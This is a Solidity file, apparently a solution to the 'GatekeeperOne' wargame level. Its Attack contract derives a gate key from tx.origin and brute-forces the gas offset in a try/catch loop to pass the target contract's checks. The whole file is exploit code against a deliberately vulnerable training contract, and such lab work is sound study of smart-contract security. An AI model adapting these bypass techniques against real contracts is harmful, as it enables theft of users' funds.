// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";
import "forge-std/Test.sol";

contract Attack {
    GatekeeperOne private immutable _GATEKEEPER_ONE;

    constructor(GatekeeperOne gatekeeperOne) {
        _GATEKEEPER_ONE = gatekeeperOne;
    }

    function attack() public {
        uint256 gas = this.getGas();
        bytes4 firstPart = hex"00000001";
        bytes2 sencondPart;
        bytes2 thirdPart = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(bytes.concat(firstPart, sencondPart, thirdPart));
        for (uint256 cost; cost < 8191; ++cost) {
            try _GATEKEEPER_ONE.enter{gas: 8191 * 100 + gas + cost}(gateKey) {
                console.log(cost);
                break;
            } catch {}
        }
    }

    function getGas() public view returns (uint256) {
        uint256 gas = gasleft();
        require(msg.sender != tx.origin);
        return (gas - gasleft());
    }
}
